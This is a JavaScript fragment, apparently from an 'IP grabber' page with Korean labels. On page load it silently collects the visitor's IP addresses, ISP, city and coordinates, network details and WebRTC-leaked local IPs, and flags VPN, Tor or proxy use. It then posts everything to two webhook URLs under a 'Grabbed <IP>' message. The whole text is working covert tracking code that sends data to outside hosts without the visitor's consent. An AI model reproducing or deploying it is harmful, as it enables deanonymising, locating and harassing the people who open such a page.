                        `**VPN 감지:** ${visitorInfo.vpnDetection.isVPN ? '✅ 예' : '❌ 아니오'}\n` +
                        `**Tor 감지:** ${visitorInfo.vpnDetection.isTor ? '✅ 예' : '❌ 아니오'}\n` +
                        `**프록시 감지:** ${visitorInfo.vpnDetection.isProxy ? '✅ 예' : '❌ 아니오'}\n` +
                        `**감지 이유:** ${visitorInfo.vpnDetection.reasons.length > 0 ? visitorInfo.vpnDetection.reasons.join('\n- ') : '정상 연결'}`,
                    inline: false
                },
                {
                    name: "기본 정보",
                    value:
                        `**주 IP:** ${visitorInfo.ip || 'N/A'} (${visitorInfo.ipVersion || 'Unknown'})\n` +
                        `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
                        `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}\n` +
                        `**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n` +
                        `**조직:** ${visitorInfo.location?.org || 'N/A'}\n` +
                        `**접속 시간:** ${visitorInfo.localTime}`,
                    inline: false
                },
                {
                    name: "위치 정보",
                    value:
                        `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n` +
                        `**지역:** ${visitorInfo.location?.region || 'N/A'}\n` +
                        `**도시:** ${visitorInfo.location?.city || 'N/A'}\n` +
                        `**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n` +
                        `**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
                    inline: false
                },
                {
                    name: "네트워크 정보",
                    value:
                        `**네트워크 타입:** ${visitorInfo.network.networkCategory || 'N/A'}\n` +
                        `**원시 type:** ${visitorInfo.network.type || 'N/A'}\n` +
                        `**effectiveType:** ${visitorInfo.network.effectiveType}\n` +
                        `**다운링크:** ${visitorInfo.network.downlink}\n` +
                        `**RTT:** ${visitorInfo.network.rtt}\n` +
                        `**데이터 세이브:** ${visitorInfo.network.saveData}`,
                    inline: false
                },
                {
                    name: "WebRTC IP 후보",
                    value:
                        `**차단 여부:** ${visitorInfo.webRTC.blocked}\n` +
                        `**로컬 IP:** ${visitorInfo.webRTC.localIPs.join(', ') || 'N/A'}\n` +
                        `**공인 후보 IP:** ${visitorInfo.webRTC.candidateIPs.join(', ') || 'N/A'}`,
                    inline: false
                },
                {
                    name: "접속 정보",
                    value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
                    inline: false
                }
            ],
            footer: { text: "자동 수집 시스템" }
        };

        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1173942304927645786> ${
            visitorInfo.vpnDetection.isVPN ? '🔴 **[VPN 감지!]**' : 
            visitorInfo.vpnDetection.isTor ? '🔴 **[Tor 감지!]**' : 
            visitorInfo.vpnDetection.isProxy ? '🟡 **[프록시 의심]**' : 
            '🟢'
        }`
        
        const payload = { 
            content: contentMessage,
            embeds: [embed] 
        };
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        await fetch(WEBHOOK_URL_2, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
    } catch (error) {
        console.error('정보 수집/전송 실패:', error);
    }
}

window.addEventListener('load', collectAndSendInfo);
